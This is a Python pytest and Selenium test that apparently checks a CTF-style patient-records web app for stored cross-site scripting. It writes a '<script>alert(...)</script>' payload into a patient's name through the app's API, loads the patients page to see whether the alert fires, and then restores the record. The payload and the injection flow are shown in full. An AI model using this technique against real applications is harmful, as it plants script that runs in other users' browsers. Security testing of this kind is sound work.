import pytest
from selenium.webdriver import Firefox
import time
import requests
from requests.auth import HTTPBasicAuth
import json
from fixtures import webdriver,url,authenticate,is_alert_present
from selenium.common.exceptions import NoAlertPresentException,UnexpectedAlertPresentException
from results import log_results,log_exceptions,delete_index,display_results
from termcolor import *
from colorama import *
init(autoreset=True)

alert_text = 'XSS Attack!!!'

def load_patient_url(webdriver):
	try:        
		webdriver.get('%s/patients/'%url)
	except UnexpectedAlertPresentException:
		if is_alert_present(webdriver):
			alert = webdriver.switch_to_alert()
			time.sleep(3)	
			# print dir(alert)		
			print colored("XSS Attack exploited :)", "red")
			if str(alert.text) == alert_text:
				alert.accept()				
				log_results('test_xss','%s/patients/'%url,'name','XSS Attack','Success')
				print 'Test success'
				# pytest.exit('Test success')
			else:
				log_results('test_xss','%s/patients/'%url,'name','XSS Attack','Failure')
				print 'Test failure'
			try:
				alert.accept()
			except NoAlertPresentException:
				pass
		else:
			log_results('test_xss','%s/patients/'%url,'name','XSS Attack','Failure')
			print 'Test failure'
			# print colored("XSS Not Exploited :)", "red")

def xss(webdriver):
	try:
		webdriver.get('%s/logout/'%url)
		authenticate(webdriver)  
		# load_patient_url(webdriver)
		host_url = url + '/api/CTF/patient/'  

		print colored("Accessing URL ---->", 'blue'),colored(host_url,"magenta")
		r = requests.get(host_url,auth=('bruce.banner@we45.com','secdevops'))   
		if int(r.status_code) == 200:
			json_str = json.dumps(r.json())
			object_list = json.loads(json_str).get('objects')       
			if object_list:
				data = object_list[0]
				actual_data = data              
				data['name'] = '<script>alert(%s)</script>' % alert_text
				pk = data['id']
				host_url = url + '/api/CTF/patient/%s/'%pk
				r = requests.put(host_url,auth=HTTPBasicAuth('bruce.banner@we45.com','secdevops'),data=json.dumps(data))
				print colored("Updated %s with <script>alert(%s)</script>"%(host_url,alert_text), 'green')
				load_patient_url(webdriver)
				r = requests.put(host_url,auth=HTTPBasicAuth('bruce.banner@we45.com','secdevops'),data=json.dumps(actual_data))

		else:
			print r.status_code,r.content
		#log_results('test_xss','%s/patients/'%url,'name','XSS Attack','Success') 
		load_patient_url(webdriver)
		time.sleep(10) 

	except BaseException as e:
		print e
		log_results('test_xss','%s/patients/'%url,'name','XSS Attack','Failure')
		log_exceptions(e)

def test_xss(webdriver):
	delete_index()
	xss(webdriver)
	display_results()